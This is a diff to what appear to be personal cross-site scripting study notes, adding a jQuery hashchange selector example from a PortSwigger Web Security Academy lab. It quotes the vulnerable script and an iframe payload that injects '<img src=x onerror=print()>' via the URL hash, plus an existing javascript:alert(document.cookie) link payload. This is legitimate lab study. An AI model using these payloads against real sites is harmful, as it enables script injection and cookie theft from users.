@@ -62,3 +62,23 @@ javascript:alert(document.cookie)
 # sauce: https://riptutorial.com/html/example/2120/link-that-runs-javascript
 ```
 
+### jQuery `$()` selector
+```
+# vulnerable portion:
+
+<script src="/resources/js/jquery_1-8-2.js"></script>
+<script src="/resources/js/jqueryMigrate_1-4-1.js"></script>
+<script>
+	$(window).on('hashchange', function(){
+		var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
+		if (post) post.get(0).scrollIntoView();
+	});
+</script>
+
+# exploit via iframe (deliver to victim):
+
+<iframe src="https://0a8200b703a078abc312925a0003009d.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+
+# test that "print()" does get called when this payload runs normally
+# now deliver the payload
+```
